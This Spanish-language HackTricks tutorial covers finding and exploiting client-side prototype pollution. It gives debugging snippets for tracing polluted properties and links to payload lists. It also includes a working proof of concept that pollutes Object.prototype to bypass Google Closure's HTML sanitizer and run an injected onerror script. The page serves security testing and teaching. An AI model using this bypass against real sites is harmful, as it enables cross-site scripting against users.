# Contaminaci√≥n de Prototipos en el Cliente

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Descubrimiento usando Herramientas Autom√°ticas

Las herramientas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **y** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) pueden ser utilizadas para **encontrar vulnerabilidades de contaminaci√≥n de prototipos**.

Adem√°s, tambi√©n podr√≠as usar la **extensi√≥n de navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear autom√°ticamente** las **p√°ginas** que **accedes** en busca de vulnerabilidades de contaminaci√≥n de prototipos.

### Depurando d√≥nde se utiliza una propiedad <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Encontrando la causa ra√≠z de Prototype Pollution <a href="#5530" id="5530"></a>

Una vez que alguna de las herramientas haya **identificado** una **vulnerabilidad de prototype pollution**, si el **c√≥digo** **no** es muy **complejo**, puedes **buscar** en el c√≥digo JS las **palabras clave** **`location.hash/decodeURIComponent/location.search`** en las Herramientas para Desarrolladores de Chrome y encontrar el lugar vulnerable.

Si el c√≥digo es grande y complejo, hay una manera f√°cil de **descubrir d√≥nde est√° el c√≥digo vulnerable**:

* Usando una de las herramientas **encuentra una vulnerabilidad** y obt√©n un **payload** que **establecer√° una propiedad** en el constructor. En ppmap se te dar√° algo como: `constructor[prototype][ppmap]=reserved`
* Ahora, establece un **punto de interrupci√≥n en la primera l√≠nea de c√≥digo JS** que se va a ejecutar en la p√°gina, y actualiza la p√°gina con el payload para que la **ejecuci√≥n se pause all√≠**.
* Mientras la ejecuci√≥n de JS est√° pausada **pega el siguiente script en la consola JS**. Este c√≥digo indicar√° una vez que la propiedad 'ppmap' sea creada, as√≠ podr√°s encontrar d√≥nde fue creada.
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
Regresa a **Sources** y haz clic en ‚Äú**Resume** script **execution**‚Äù. Despu√©s de hacerlo, todo el **javascript** se **ejecutar√°** y ppmap se contaminar√° de nuevo como se esperaba. Con la ayuda del Fragmento podemos encontrar d√≥nde exactamente se contamina la propiedad ppmap. Podemos **hacer clic** en el **Call** **Stack** y te enfrentar√°s a **diferentes** **pilas** donde la **contaminaci√≥n** **ocurri√≥**.

¬øPero cu√°l elegir? La mayor√≠a de las veces, la Contaminaci√≥n de Prototipos ocurre en bibliotecas de Javascript, as√≠ que apunta a la pila que est√° adjunta a los archivos de biblioteca .js (mira al lado derecho, como en la imagen, para saber a qu√© punto final est√° adjunta la pila). En este caso tenemos 2 pilas en la l√≠nea 4 y 6, l√≥gicamente elegiremos la l√≠nea 4 porque esa l√≠nea es la primera vez que ocurre la Contaminaci√≥n, lo que significa que esta l√≠nea es la raz√≥n de la vulnerabilidad. Hacer clic en la pila nos redirigir√° al c√≥digo vulnerable.

![](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrando Gadgets de Script

El gadget es el **c√≥digo que ser√° abusado una vez que se descubre una vulnerabilidad de PP**.

Si la aplicaci√≥n es simple, podemos **buscar** **palabras clave** como **`srcdoc/innerHTML/iframe/createElement`** y revisar el c√≥digo fuente y verificar si **conduce a la ejecuci√≥n de javascript**. A veces, las t√©cnicas mencionadas podr√≠an no encontrar gadgets en absoluto. En ese caso, la revisi√≥n pura del c√≥digo fuente revela algunos gadgets interesantes como el siguiente ejemplo.

### Ejemplo de encontrar un gadget de PP en el c√≥digo de la biblioteca Mithil

Revisa este art√≠culo: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilaci√≥n de payloads para bibliotecas vulnerables

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de Sanitizadores HTML v√≠a PP

[**Esta investigaci√≥n**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) muestra gadgets de PP para usar para **evitar las sanitizaciones** proporcionadas por algunas bibliotecas de sanitizadores HTML:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referencias

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Aprende AWS hacking de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
